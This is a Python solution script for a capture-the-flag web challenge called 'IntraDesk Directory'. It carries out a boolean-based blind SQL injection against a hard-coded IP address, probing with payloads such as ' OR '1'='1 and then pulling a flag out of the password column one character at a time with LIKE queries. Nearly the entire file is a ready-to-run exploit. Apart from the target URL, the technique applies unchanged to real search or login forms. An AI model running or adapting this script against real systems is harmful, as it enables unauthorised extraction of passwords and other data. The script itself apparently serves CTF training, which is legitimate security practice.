#!/usr/bin/env python3
"""
IntraDesk Directory CTF Challenge - SQL Injection Solution
UCL x KCL Friendly CTF

This script demonstrates the SQL injection vulnerability in the IntraDesk Directory
search application and extracts the flag from the password column.
"""

import requests
import urllib.parse
import string

TARGET_URL = "http://13.53.139.173/web1/"

def test_injection(payload):
    """Test if a SQL injection payload returns results."""
    url = f"{TARGET_URL}?user={urllib.parse.quote(payload)}&dept=All&office=Any"
    try:
        r = requests.get(url, timeout=5)
        return "'ok'>" in r.text
    except:
        return None

def discover_vulnerability():
    """Demonstrate the SQL injection vulnerability."""
    print("=" * 60)
    print("Step 1: Discovering SQL Injection Vulnerability")
    print("=" * 60)

    # Normal query
    result = test_injection("admin")
    print(f"Normal query 'admin': {'Found' if result else 'Not found'}")

    # SQL injection - OR true
    result = test_injection("' OR '1'='1")
    print(f"SQL injection \"' OR '1'='1\": {'Found' if result else 'Not found'}")

    # Discover column name
    result = test_injection("' OR username='admin")
    print(f"Column discovery \"' OR username='admin\": {'Found' if result else 'Not found'}")

    # Discover password column
    result = test_injection("' OR password LIKE '%")
    print(f"Password column \"' OR password LIKE '%\": {'Found' if result else 'Not found'}")

def extract_flag():
    """Extract the flag from the password column."""
    print("\n" + "=" * 60)
    print("Step 2: Extracting Flag from Password Column")
    print("=" * 60)

    # Put } before _ to ensure we detect the end of flag properly
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "}-_{"

    # Start extracting
    current = ""

    # First check if flag starts with common prefixes
    for prefix in ["flag{", "FLAG{"]:
        if test_injection(f"' OR password LIKE '{prefix}%"):
            current = prefix
            print(f"Found prefix: {prefix}")
            break

    if not current:
        print("Could not find flag prefix!")
        return None

    # Extract character by character
    while len(current) < 100:
        found = False
        for c in chars:
            payload = f"' OR password LIKE '{current}{c}%"
            if test_injection(payload):
                current += c
                print(f"Progress: {current}")
                found = True
                if c == "}":
                    print(f"\n*** FLAG FOUND: {current} ***")
                    return current
                break
        if not found:
            break

    return current

def verify_flag(flag):
    """Verify the extracted flag is correct."""
    print("\n" + "=" * 60)
    print("Step 3: Verifying Flag")
    print("=" * 60)

    payload = f"' OR password = '{flag}"
    if test_injection(payload):
        print(f"VERIFIED: {flag}")
        return True
    else:
        print("Flag verification FAILED!")
        return False

def main():
    print("IntraDesk Directory - SQL Injection Solution")
    print("=" * 60)

    # Discover the vulnerability
    discover_vulnerability()

    # Extract the flag
    flag = extract_flag()

    if flag:
        # Verify the flag
        verify_flag(flag)

        print("\n" + "=" * 60)
        print("SOLUTION COMPLETE")
        print("=" * 60)
        print(f"\nFLAG: {flag}")
    else:
        print("Failed to extract flag!")

if __name__ == "__main__":
    main()
